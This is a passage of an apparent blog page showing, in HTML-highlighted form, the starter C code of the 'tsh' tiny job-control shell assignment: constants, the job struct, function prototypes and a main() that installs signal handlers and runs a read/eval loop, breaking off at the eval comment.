class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tsh - A tiny shell program with job control</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Put your name and login ID here&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Misc manifest constants */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXLINE 1024   <span class="comment">/* max line size */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXARGS 128    <span class="comment">/* max args on a command line */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJOBS 16     <span class="comment">/* max jobs at any point in time */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXJID 1 &lt;&lt; 16 <span class="comment">/* max job ID */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Job states */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNDEF 0 <span class="comment">/* undefined */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FG 1    <span class="comment">/* running in foreground */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BG 2    <span class="comment">/* running in background */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ST 3    <span class="comment">/* stopped */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Jobs states: FG (foreground), BG (background), ST (stopped)</span></span><br><span class="line"><span class="comment"> * Job state transitions and enabling actions:</span></span><br><span class="line"><span class="comment"> *     FG -&gt; ST  : ctrl-z</span></span><br><span class="line"><span class="comment"> *     ST -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> *     ST -&gt; BG  : bg command</span></span><br><span class="line"><span class="comment"> *     BG -&gt; FG  : fg command</span></span><br><span class="line"><span class="comment"> * At most 1 job can be in the FG state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;   <span class="comment">/* defined in libc */</span></span><br><span class="line"><span class="keyword">char</span> prompt[] = <span class="string">&quot;tsh&gt; &quot;</span>; <span class="comment">/* command line prompt (DO NOT CHANGE) */</span></span><br><span class="line"><span class="keyword">int</span> verbose = <span class="number">0</span>;         <span class="comment">/* if true, print additional output */</span></span><br><span class="line"><span class="keyword">int</span> nextjid = <span class="number">1</span>;         <span class="comment">/* next job ID to allocate */</span></span><br><span class="line"><span class="keyword">char</span> sbuf[MAXLINE];      <span class="comment">/* for composing sprintf messages */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span></span></span><br><span class="line"><span class="class">&#123;</span>                          <span class="comment">/* The job struct */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;             <span class="comment">/* job PID */</span></span><br><span class="line">    <span class="keyword">int</span> jid;               <span class="comment">/* job ID [1, 2, ...] */</span></span><br><span class="line">    <span class="keyword">int</span> state;             <span class="comment">/* UNDEF, BG, FG, or ST */</span></span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE]; <span class="comment">/* command line */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> <span class="title">jobs</span>[<span class="title">MAXJOBS</span>];</span> <span class="comment">/* The job list */</span></span><br><span class="line"><span class="comment">/* End global variables */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Function prototypes */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are the functions that you will implement */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we&#x27;ve provided for you */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parseline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmdline, <span class="keyword">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clearjob</span><span class="params">(struct <span class="keyword">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">addjob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid, <span class="keyword">int</span> state, <span class="keyword">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">deletejob</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fgpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobpid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function">struct <span class="keyword">job_t</span> *<span class="title">getjobjid</span><span class="params">(struct <span class="keyword">job_t</span> *jobs, <span class="keyword">int</span> jid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pid2jid</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">listjobs</span><span class="params">(struct <span class="keyword">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unix_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * main - The shell&#x27;s main routine </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> cmdline[MAXLINE];</span><br><span class="line">    <span class="keyword">int</span> emit_prompt = <span class="number">1</span>; <span class="comment">/* emit prompt (default) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect stderr to stdout (so that driver will get all output</span></span><br><span class="line"><span class="comment">     * on the pipe connected to stdout) */</span></span><br><span class="line">    dup2(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the command line */</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getopt(argc, argv, <span class="string">&quot;hvp&quot;</span>)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (c)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>: <span class="comment">/* print help message */</span></span><br><span class="line">            usage();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>: <span class="comment">/* emit additional diagnostic info */</span></span><br><span class="line">            verbose = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:            <span class="comment">/* don&#x27;t print a prompt */</span></span><br><span class="line">            emit_prompt = <span class="number">0</span>; <span class="comment">/* handy for automatic testing */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Install the signal handlers */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* These are the ones you will need to implement */</span></span><br><span class="line">    Signal(SIGINT, sigint_handler);   <span class="comment">/* ctrl-c */</span></span><br><span class="line">    Signal(SIGTSTP, sigtstp_handler); <span class="comment">/* ctrl-z */</span></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler); <span class="comment">/* Terminated or stopped child */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This one provides a clean way to kill the shell */</span></span><br><span class="line">    Signal(SIGQUIT, sigquit_handler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize the job list */</span></span><br><span class="line">    initjobs(jobs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Execute the shell&#x27;s read/eval loop */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Read command line */</span></span><br><span class="line">        <span class="keyword">if</span> (emit_prompt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, prompt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>) == <span class="literal">NULL</span>) &amp;&amp; ferror(<span class="built_in">stdin</span>))</span><br><span class="line">            app_error(<span class="string">&quot;fgets error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))</span><br><span class="line">        &#123; <span class="comment">/* End of file (ctrl-d) */</span></span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Evaluate the command line */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* control never reaches here */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it 